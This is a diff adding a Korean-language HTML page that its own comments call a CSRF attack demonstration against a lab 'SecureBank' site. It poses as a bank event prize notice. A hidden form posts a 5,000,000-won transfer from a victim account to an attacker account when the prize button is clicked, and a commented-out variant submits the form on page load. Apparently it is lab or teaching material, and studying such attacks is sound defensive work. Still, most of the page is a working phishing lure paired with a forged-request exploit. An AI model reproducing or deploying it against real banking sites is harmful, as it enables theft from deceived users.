@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<title>SecureBank 이벤트 당첨 안내 🎉</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
+body{background:#f4f6f9;display:flex;justify-content:center;align-items:center;height:100vh;}
+.box{background:white;border-radius:16px;padding:50px 60px;text-align:center;box-shadow:0 4px 30px rgba(0,0,0,0.12);max-width:440px;}
+h2{color:#1a3c6e;margin-bottom:12px;font-size:24px;}
+p{color:#666;font-size:14px;line-height:1.7;margin-bottom:24px;}
+button{background:#4fc3f7;color:#1a3c6e;border:none;padding:14px 40px;border-radius:30px;font-size:16px;font-weight:700;cursor:pointer;}
+button:hover{background:#2196f3;color:white;}
+.small{font-size:11px;color:#bbb;margin-top:16px;}
+</style>
+</head>
+<body>
+
+<!--
+  [CSRF 공격 시연 페이지]
+  공격자가 피해자에게 이 HTML을 링크로 전송.
+  피해자가 SecureBank에 로그인된 상태에서 이 페이지를 열면
+  → 숨겨진 폼이 자동 submit 되어 공격자 계좌로 이체 실행.
+  피해자는 아무것도 모름.
+-->
+
+<!-- [취약] 숨겨진 CSRF 위조 이체 폼 -->
+<form id="csrf_form"
+      action="http://192.168.0.2/victim-site/transfer.php"
+      method="POST"
+      style="display:none;">
+  <input type="hidden" name="from_account" value="110-123-456789">  <!-- 피해자 계좌 -->
+  <input type="hidden" name="to_account"   value="110-000-000001">  <!-- 공격자 계좌(admin) -->
+  <input type="hidden" name="amount"       value="5000000">         <!-- 500만원 -->
+</form>
+
+<div class="box">
+  <h2>🎉 축하합니다!</h2>
+  <p>
+    SecureBank 봄맞이 이벤트에 당첨되셨습니다!<br>
+    아래 버튼을 눌러 경품을 수령하세요.
+  </p>
+  <button onclick="collect()">경품 수령하기</button>
+  <p class="small">본 이벤트는 SecureBank 공식 이벤트입니다.</p>
+</div>
+
+<script>
+function collect() {
+  // 버튼 클릭 시 위조 이체 폼 자동 제출
+  document.getElementById('csrf_form').submit();
+}
+
+// 또는 페이지 열자마자 자동 실행되는 버전:
+// window.onload = () => document.getElementById('csrf_form').submit();
+</script>
+
+</body>
+</html>
